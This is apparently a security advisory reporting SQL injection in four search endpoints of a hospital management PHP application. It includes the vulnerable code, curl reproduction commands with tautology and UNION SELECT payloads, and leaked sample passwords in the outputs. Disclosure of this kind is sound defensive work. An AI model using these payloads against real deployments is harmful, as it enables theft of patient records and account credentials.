### Title

SQL injection in `appsearch.php`, `patientsearch.php`, `doctorsearch.php`, and `messearch.php` leaks patient, doctor, appointment, and contact-form data

### Summary

The four search endpoints concatenate user-supplied search parameters directly into `SELECT` statements. UNION-based SQL injection allows an unauthenticated attacker to read arbitrary rows from the database, and the responses to legitimate queries already expose sensitive columns (plaintext passwords for `patreg` and `doctb`, full appointment history for `appointmenttb`, contact-form messages for `contact`).

### Affected Version

Commit: `bc3bb9cbadfb2b1afb36660b5119ff42a03a7a25`

### Vulnerability Type

SQL Injection (CWE-89)

### Affected Code

File: `appsearch.php`

```php
$contact=$_POST['app_contact'];
$query = "select * from appointmenttb where contact= '$contact';";
```

File: `patientsearch.php`

```php
$contact=$_POST['patient_contact'];
$query = "select * from patreg where contact= '$contact'";
...
echo "<td>$password</td>";
```

File: `doctorsearch.php`

```php
$contact=$_POST['doctor_contact'];
$query = "select * from doctb where email= '$contact'";
...
echo "<td>$password</td>";
```

File: `messearch.php`

```php
$contact=$_POST['mes_contact'];
$query = "select * from contact where contact= '$contact'";
```

### Root Cause

The application trusts `$_POST` input, embeds it verbatim in single-quoted SQL literals, and calls `mysqli_query()` without binding. There is no allowlist, parameter type check, or input length cap. The retrieved rows are echoed into the response body with no escaping, so any data injected via UNION-based payloads is rendered directly to the attacker.

### Steps to Reproduce

1. Deploy the application and set `BASE_URL`.

```bash
BASE_URL="http://hms.localhost"
```

2. Confirm that `patientsearch.php` reveals the plaintext password of any patient whose contact is known.

```bash
curl -sS "$BASE_URL/patientsearch.php" \
  --data-urlencode "patient_search_submit=1" \
  --data-urlencode "patient_contact=8838489464" \
  | sed -n 's:.*<td>\(.*\)</td>.*:\1:p' | tail -10
```

Observed response (excerpt):

```html
<td>Kishan</td>
<td>Lal</td>
<td>kishansmart0@gmail.com</td>
<td>8838489464</td>
<td>kishan123</td>
```

3. Confirm that `doctorsearch.php` reveals the plaintext password of any doctor.

```bash
curl -sS "$BASE_URL/doctorsearch.php" \
  --data-urlencode "doctor_search_submit=1" \
  --data-urlencode "doctor_contact=ashok@gmail.com" \
  | sed -n 's:.*<td>\(.*\)</td>.*:\1:p' | tail -10
```

Observed response (excerpt):

```html
<td>ashok</td>
<td>ashok123</td>
<td>ashok@gmail.com</td>
<td>500</td>
```

4. Confirm UNION-based SQL injection on `patientsearch.php`.

```bash
curl -sS "$BASE_URL/patientsearch.php" \
  --data-urlencode "patient_search_submit=1" \
  --data-urlencode "patient_contact=' OR '1'='1" \
  | grep -oE '<td>[^<]+</td>' | head -20
```

Observed response (every patient row is returned):

```html
<td>Ram</td>
<td>Kumar</td>
<td>ram@gmail.com</td>
<td>9876543210</td>
<td>ram123</td>
```

5. Confirm UNION-based SQL injection on `appsearch.php`, returning the first synthetic row whose columns are attacker-controlled integers.

```bash
curl -sS "$BASE_URL/appsearch.php" \
  --data-urlencode "app_search_submit=1" \
  --data-urlencode "app_contact=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 -- -" \
  | grep -oE '<td>[^<]+</td>' | head -20
```

Observed response (excerpt):

```html
<td>3</td>
<td>4</td>
<td>6</td>
<td>7</td>
<td>8</td>
```

6. Confirm UNION-based SQL injection on `doctorsearch.php` and `messearch.php`.

```bash
curl -sS "$BASE_URL/doctorsearch.php" \
  --data-urlencode "doctor_search_submit=1" \
  --data-urlencode "doctor_contact=' UNION SELECT 1,2,3,4,5 -- -" \
  | grep -oE '<td>[^<]+</td>'
```

```text
1
2
3
5
```

```bash
curl -sS "$BASE_URL/messearch.php" \
  --data-urlencode "mes_search_submit=1" \
  --data-urlencode "mes_contact=' UNION SELECT 1,2,3,4 -- -" \
  | grep -oE '<td>[^<]+</td>'
```

```text
1
2
3
4
```

### Impact

An unauthenticated attacker can read every patient, doctor, appointment, and contact-form record by submitting `'` or `' OR '1'='1`. With UNION-based payloads, any column from any table in the `myhmsdb` database can be exfiltrated. The endpoints already include the plaintext password column for `patreg` and `doctb` in their normal responses, so the credentials of every account in the system are disclosed without any injection.

### CVSS 3.1

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Score: 7.5 (High)
```
